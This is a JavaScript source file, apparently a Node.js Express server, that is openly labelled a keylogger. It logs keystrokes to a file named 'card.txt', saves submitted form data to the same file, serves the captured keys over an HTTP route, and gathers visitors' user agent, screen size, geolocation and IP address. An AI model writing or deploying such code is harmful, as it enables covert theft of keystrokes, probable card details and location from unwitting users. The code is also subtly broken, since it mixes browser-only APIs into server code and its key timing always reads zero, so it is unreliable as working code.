const express = require("express");
const app = express();
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");
const port = 9000;

// Keylogger
let keys = [];
let lastTime = new Date().getTime();

process.stdin.setRawMode(true);
process.stdin.resume();
process.stdin.setEncoding('utf8');

console.log('Press any key to start logging...');

process.stdin.on('data', (key) => {
  let now = new Date().getTime();
  keys.push({
    key: key,
    time: now - lastTime
  });
  lastTime = now;

  // Save key to file
  fs.appendFile("card.txt", `Key: ${key} | Time: ${now - lastTime}ms\n`, (err) => {
    if (err) throw err;
    console.log(`Key: ${key} | Time: ${now - lastTime}ms`);
  });
});

// Express app
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/submit", (req, res) => {
  console.log(req.body);
  fs.writeFile("card.txt", JSON.stringify(req.body), (err) => {
    if (err) throw err;
    console.log("The file has been saved!");
  });
  res.sendFile(path.join(__dirname, "confirmation.html"));
});

app.get("/keys", (req, res) => {
  res.send(keys);
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});

// Get user agent string
const userAgent = navigator.userAgent;
console.log('User agent: ', userAgent);

// Get user's screen resolution
const screenWidth = window.screen.width;
const screenHeight = window.screen.height;
console.log('Screen resolution: ', screenWidth, 'x', screenHeight);

// Get user's current location
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(position) {
    console.log('Latitude: ', position.coords.latitude);
    console.log('Longitude: ', position.coords.longitude);

    // Save location to file
    fs.appendFile("card.txt", `Latitude: ${position.coords.latitude} | Longitude: ${position.coords.longitude}\n`, (err) => {
      if (err) throw err;
      console.log(`Latitude: ${position.coords.latitude} | Longitude: ${position.coords.longitude}`);
    });
  });
} else {
  console.log('Geolocation is not supported by this browser.');
}

// Get user's IP address
fetch('https://api.ipify.org/?format=json')
  .then(response => response.json())
  .then(data => {
    console.log('IP address: ', data.ip);

    // Save IP address to file
    fs.appendFile("card.txt", `IP address: ${data.ip}\n`, (err) => {
      if (err) throw err;
      console.log(`IP address: ${data.ip}`);
    });
  })
  .catch(error => console.error(error));

// Get user's browser information
console.log('Browser name: ', navigator.appName);
console.log('Browser version: ', navigator.appVersion);
console.log('Cookies enabled: ', navigator.cookieEnabled);

// Get user's operating system
console.log('Operating system: ', navigator.platform);
console.log('Language: ', navigator.language);

